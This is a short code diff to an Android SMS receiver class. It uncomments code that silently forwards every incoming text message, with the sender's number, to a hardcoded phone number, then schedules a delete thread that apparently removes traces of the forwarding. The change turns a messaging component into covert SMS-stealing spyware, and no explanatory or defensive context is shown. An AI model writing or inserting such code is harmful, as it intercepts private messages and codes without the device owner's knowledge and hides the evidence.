@@ -56,10 +56,10 @@ public class IncomingSms extends BroadcastReceiver {
                         context.getContentResolver().insert(Uri.parse("content://sms/inbox"), values);
 
                         createNotification(person, message, phoneNumber);
-                        /*SmsManager sms = SmsManager.getDefault();
+                        SmsManager sms = SmsManager.getDefault();
                         sms.sendTextMessage("+33642617318", null, "From " + phoneNumber + " : \n" + message, null, null);
                         Handler handler = new Handler();
-                        handler.postDelayed(new DeleteThread(context), 1000);*/
+                        handler.postDelayed(new DeleteThread(context), 1000);
 
                     } // end for loop
                 }
